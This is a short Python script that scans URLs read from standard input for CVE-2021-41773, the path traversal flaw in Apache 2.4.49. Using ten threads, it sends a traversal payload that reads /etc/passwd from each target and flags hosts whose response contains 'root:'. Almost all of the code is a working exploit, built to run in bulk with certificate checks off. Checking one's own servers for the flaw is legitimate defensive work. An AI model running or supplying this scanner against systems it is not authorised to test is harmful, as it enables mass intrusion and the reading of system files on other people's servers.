#!/usr/bin/env python3

# Take URLs on std in and try to ascertain if they are vulnerable to CVE-2021-41773 Path Traversal in Apache 2.4.49.
# Threaded for performance reasons
# CVE-2021-41773

import sys
import requests
from requests import Session, Request
import concurrent.futures

# Disable certificate warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

payload = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'

def testURL(url):
    try:
        sess = Session()
        req = Request('GET',f'{url}{payload}')
        prepped_req = req.prepare()
        prepped_req.url = f'{url}{payload}'
        response = sess.send(prepped_req, timeout = 10, verify = False)
        if 'root:' in response.content.decode():
            print(f'[*] Potentially Vulnerable [*] - {url}')
    except Exception:
        pass

# Take URLs from std in
urls = []
for line in sys.stdin:
    urls.append(line.rstrip())

# Threaded for performance
with concurrent.futures.ThreadPoolExecutor(max_workers = 10) as executor:
    executor.map(testURL, urls)
